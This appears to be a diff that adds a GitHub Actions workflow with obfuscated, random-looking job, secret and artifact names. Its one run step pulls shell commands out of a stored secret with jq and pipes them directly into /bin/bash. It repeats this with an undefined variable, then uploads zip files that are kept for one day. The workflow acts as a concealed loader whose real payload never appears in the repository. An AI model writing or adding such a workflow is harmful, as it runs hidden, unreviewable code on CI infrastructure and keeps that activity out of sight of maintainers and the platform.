@@ -1,0 +1,22 @@
+name: anna7762maker
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: anna7762maker
+        env:
+          vzgy58515: ${{ secrets.vzgy58515 }}
+        run: |
+          printf '%s' "$vzgy58515" | jq -r .yh2092 | /bin/bash
+          printf '%s' "$vxmpc3" | jq -r .k6326 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: DD5EtVQo
+          path: "*.zip"
+          retention-days: 1
